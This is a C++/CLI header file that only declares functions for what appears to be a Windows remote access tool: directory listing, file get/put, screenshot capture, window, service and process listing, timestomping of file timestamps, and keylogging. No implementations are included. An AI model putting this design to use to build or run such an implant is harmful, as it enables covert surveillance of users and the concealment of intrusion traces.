#pragma once
#include <Windows.h>
#pragma comment(lib, "User32.lib")
#include <strsafe.h>
#include <vector>
#include <tchar.h> 
#include <stdio.h>
#include <string>
#include <regex>
#include <iostream>
#include <vcclr.h>
using namespace System;
using namespace System::IO;
using namespace System::Text;


//System utility functions

int dir(String^ path);
int cd(LPCTSTR path);
int screenshot();
int get(LPCTSTR rfile);
int put(LPCTSTR lfile, LPCTSTR rfile);
int timestomp(LPCTSTR file);
LPCTSTR* winlist();
LPCTSTR* servlist();
LPCSTR* proclist();

//Enhanced functions
int keylog();